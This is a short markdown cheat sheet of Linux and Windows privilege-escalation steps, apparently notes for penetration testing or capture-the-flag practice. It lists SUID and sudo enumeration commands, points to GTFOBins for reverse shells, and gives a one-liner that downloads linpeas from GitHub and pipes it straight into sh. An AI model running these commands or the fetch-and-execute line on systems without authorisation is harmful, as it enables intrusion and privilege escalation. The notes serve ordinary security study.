# Linux - GTFOBins
## [GTFOBins](https://gtfobins.github.io/gtfobins/bash/#sudo)
### if there is remote code execution you can use gtfobins for reverse shells
### finding binaries with SUID
```bash
find / -perm /4000 2> /dev/null
```

### finding sudo commands
```bash
sudo -l
```

### lastly, use linpeas so it can find every other attack vector for you
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

# Windows - WADComs
## [WADComs](https://wadcoms.github.io/#)
### use winpeas
[winpeas download](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

### use WADComs to exploit whatever winpeas found

## this also has anything you may need [hacktricks.xyz](https://book.hacktricks.xyz/)
